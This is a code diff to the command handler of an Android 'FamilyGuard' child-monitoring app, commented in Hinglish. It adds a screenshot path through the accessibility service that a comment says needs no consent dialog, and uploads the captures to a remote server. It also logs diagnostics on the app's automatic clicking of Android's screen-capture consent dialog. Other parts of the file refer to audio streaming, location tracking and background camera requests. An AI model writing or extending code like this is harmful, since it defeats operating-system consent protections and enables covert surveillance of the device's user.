@@ -20,6 +20,7 @@ import com.familyguard.child.admin.AdminReceiver
 import com.familyguard.child.data.Api
 import com.familyguard.child.data.ChildApp
 import com.familyguard.child.data.Store
+import com.familyguard.child.service.EnforcementService
 import com.familyguard.child.service.Locator
 import com.familyguard.child.service.AudioStreamer
 import com.familyguard.child.service.MainService
@@ -30,6 +31,9 @@ import com.familyguard.child.ui.BlockOverlay
 import com.familyguard.child.ui.ConsentActivity
 import com.familyguard.child.ui.ForegroundPokeActivity
 import com.familyguard.child.util.SelfHeal
+import android.graphics.Bitmap
+import java.io.File
+import java.io.FileOutputStream
 import com.google.gson.JsonArray
 import com.google.gson.JsonObject
 import kotlinx.coroutines.delay
@@ -134,7 +138,13 @@ object CommandHandler {
             }
 
             "screenshot" -> {
-                val f = MirrorManager.captureOnce(ctx)
+                // vc13 ZERO-TOUCH ORDER: ① projection live hai → captureOnce (live
+                // frame); ② nahi → a11y ka apna takeScreenshot (Android 11+,
+                // CONSENT DIALOG KI ZAROORAT NAHI — Android 15 ne consent
+                // auto-confirm roka tha to screenshot bhi atak jata tha); ③ dono
+                // fail (a11y off / Android <11) → purana consent fallback.
+                val f = (MirrorManager.captureOnce(ctx)
+                    ?: a11yScreenshot(ctx))
                 if (f != null) {
                     val url = Api.uploadMedia(f)
                     data.addProperty("url", url)
@@ -280,6 +290,18 @@ object CommandHandler {
                         == PackageManager.PERMISSION_GRANTED
                 )
                 data.addProperty("frames", MirrorManager.frameCount)
+                // vc13: consent auto-click ki SACHAI — pichli koshish me pass
+                // chala? button dikha? dialog kis package me dikha? consent ka
+                // result kya raha? Phone check inhi se exact next-step batata hai.
+                data.addProperty("clickPassRuns", EnforcementService.clickPassRuns)
+                data.addProperty("clickPassSawBtn", EnforcementService.clickPassSawBtn)
+                if (EnforcementService.lastDialogPkg.isNotBlank()) {
+                    data.addProperty("dialogPkg", EnforcementService.lastDialogPkg)
+                }
+                if (Store.lastConsentResult.isNotBlank()) {
+                    data.addProperty("consentResult", Store.lastConsentResult)
+                }
+                data.addProperty("a11yShot", EnforcementService.a11yShotCapable())
                 val ago = MirrorManager.lastFrameAgoSec()
                 if (ago != null) data.addProperty("lastFrameAgoSec", ago)
                 val pending = Store.pendingMirrorFps
@@ -608,6 +630,7 @@ object CommandHandler {
             Store.projectionRequestedAt = 0L
             Store.lastConsentRequestAt = 0L
             Store.consentUiAt = 0L
+            if (Store.lastConsentResult == "pending") Store.lastConsentResult = "timeout"
             sendMirrorState(
                 false,
                 "Consent dialog confirm nahi ho paya (40s) — bachche ke phone par " +
@@ -638,6 +661,31 @@ object CommandHandler {
         } catch (_: Exception) {
             false
         }
+    }
+
+    /** ZERO-TOUCH SCREENSHOT (vc13, Android 11+): a11y takeScreenshot se bitmap
+     *  → 720-max-side JPEG (MirrorService scale jaisa hi, upload size sane).
+     *  null = a11y off/capability nahi — caller purane consent fallback par jayega. */
+    private suspend fun a11yScreenshot(ctx: Context): File? {
+        if (Build.VERSION.SDK_INT < 30) return null
+        val bmp = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
+            runCatching { EnforcementService.captureViaA11y() }.getOrNull()
+        } ?: return null
+        return runCatching {
+            val maxSide = maxOf(bmp.width, bmp.height)
+            val scale = if (maxSide > 720) 720f / maxSide else 1f
+            val out = if (scale < 1f) {
+                Bitmap.createScaledBitmap(
+                    bmp,
+                    (bmp.width * scale).toInt().coerceAtLeast(1),
+                    (bmp.height * scale).toInt().coerceAtLeast(1),
+                    true
+                )
+            } else bmp
+            val f = File(ctx.cacheDir, "a11y_shot_${System.currentTimeMillis()}.jpg")
+            FileOutputStream(f).use { fos -> out.compress(Bitmap.CompressFormat.JPEG, 85, fos) }
+            f
+        }.getOrNull()
     }
 
     /** Camera permission background request — transparent activity runtime
@@ -728,6 +776,7 @@ object CommandHandler {
         if (inFlight && now - Store.lastConsentRequestAt < 20_000L) return false
         Store.lastConsentRequestAt = now
         Store.projectionRequestedAt = now
+        Store.lastConsentResult = "pending" // vc13: cycle shuru — result aage hoga
         // BAL-SAFE START (vc10): pehle a11y-bound service context (exempt), phir
         // normal context. Bina overlay ke bhi dialog khulti hai jab a11y ON hai —
         // fresh-install/update ke baad yahi scene hota hai.
